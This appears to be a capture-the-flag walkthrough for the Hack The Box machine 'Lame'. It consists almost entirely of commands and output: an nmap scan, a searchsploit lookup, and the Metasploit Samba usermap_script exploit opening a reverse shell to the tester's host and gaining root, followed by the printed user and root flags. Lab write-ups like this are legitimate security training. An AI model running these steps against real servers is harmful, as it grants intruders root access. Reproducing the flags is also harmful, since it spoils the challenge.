# lame: https://app.hackthebox.com/machines/Lame

```bash
nmap -sC -sV 10.10.10.3 -Pn
Nmap scan report for 10.10.10.3
Host is up (0.10s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.13
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m19s, deviation: 2h49m46s, median: 16s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-04-15T09:36:31-04:00
```

```bash
cat /etc/hosts | grep 10.10.10.3                                        

10.10.10.3	lame.hackthebox.gr hackthebox.gr
```

```bash
searchsploit 3.0.20     

Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)           | unix/remote/16320.rb

```

```bash
msf6 > search 3.0.20

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank       Check  Description
   -  ----                                                   ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
   1  auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation

Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/http/wp_easycart_privilege_escalation

msf6 > use 0

msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.13
LHOST => 10.10.14.13
msf6 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
```

```bash
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Command shell session 1 opened (10.10.14.13:4444 -> 10.10.10.3:39670) at 2023-04-15 10:38:04 -0400

id
uid=0(root) gid=0(root)

```

```bash
cd /home/makis
ls
user.txt
cat user.txt	
800f9c0a7d06878b1b8d6262d07d7779
```
```bash
cat /root/root.txt
e8e7e97c8c1e00191b00c78badbf07f2
```
